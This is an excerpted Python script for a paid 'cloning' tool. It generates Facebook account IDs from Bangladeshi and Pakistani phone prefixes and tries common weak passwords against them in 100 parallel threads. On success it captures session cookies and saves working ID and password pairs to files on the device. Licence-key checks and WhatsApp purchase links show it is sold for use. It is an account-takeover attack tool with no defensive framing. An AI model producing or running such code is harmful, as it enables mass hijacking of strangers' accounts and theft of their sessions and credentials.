...
ha = current.day
today = date.today()
#os.system('xdg-open https://youtube.com/@cybercriminalforce3443')
os.system('espeak -a 300 "WELCOME TO SAKIB RANDOM CLONING TOOLS"')
logo ="""
...
\x1b[1;97m[+]==============================================[+]
\x1b[1;91m[+] CREATED BY   :  MD NAJMUS SAKIB
\x1b[1;92m[+] ON FACEBOK   :  MD NAJMUS SAKIB
\x1b[1;93m[+] ON GITHUB    :  SAKIBBHAI1234
\x1b[1;94m[+] TOOL STATUS  :  PAID 
\x1b[1;95m[+] TOOL VIRSION :  2.0.9 LAST UPDATE 
\x1b[1;96m[+]==============================================[+]"""
loop = 0
oks = []
cps = []
...
def SAKIB():
    os.system('clear')
    os.system('xdg-open https://youtube.com/@cybercriminalforce')
    SAKIB_Hasan(logo)
...
def SAKIB_email():
    ...
    os.system("clear")
    SAKIB_Hasan(logo)
    SAKIB_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    SAKIB_Hasan(" -----------------------------------------------------------------------------------")
    rk1 = '.'
    rk2 = '1'
    rk3 = '0'
    ...
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        SAKIB_Hasan('\033[1;97m====================================================')
        SAKIB_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        SAKIB_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        SAKIB_Hasan(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        SAKIB_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        SAKIB_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        SAKIB_Hasan('\033[1;97m====================================================')
        for love in user:
            SAKIBuser=fastname+code+lasttname+love
...
def SAKIB_bd():
    ...
    with ThreadPool(max_workers=100) as manshera:
        ...
        SAKIB_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        SAKIB_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        SAKIB_Hasan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        SAKIB_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        SAKIB_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        SAKIB_Hasan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'Bangladesh','bangladesh','i love you','free fire','freefire']
            uid = code+love
            for SAKIB in HamiiID:
                pwx.append(SAKIB)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} --------------------------------------------------------------------------------------")
...
def SAKIB_pk():
    ...
    os.system("clear")
    SAKIB_Hasan(logo)
    SAKIB_Hasan(f' [{xr}^{x}] Example>: {xr}92318,92345,92323,92306.ETC{x}')
    SAKIB_Hasan(" ----------------------------------------------------------------------------------------------------")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[SAKIB-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                sn4gdh9('/sdcard/SAKIB-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                sn4gdh9('/sdcard/SAKIB-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def reg():
    ...
    r = requests.get('https://github.com/Sakibbhai123/approval.txt.git').text
    if to in r:
        os.system('clear')
        ...
        os.system('am start https://wa.me/+8801316165549?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SAKIB%20Paid%20Tools.%20My%20Key:%20'+id+SAKIB)
        reg()
...
def reg2():
    ...
    print (' Your id: ' + id+SAKIB)
    print ('')
    input(' Press enter to go to whatsapp ')
    os.system('am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20SAKIB=MEX%20Paid%20Tools.%20My%20Key:%20'+id+SAKIB)
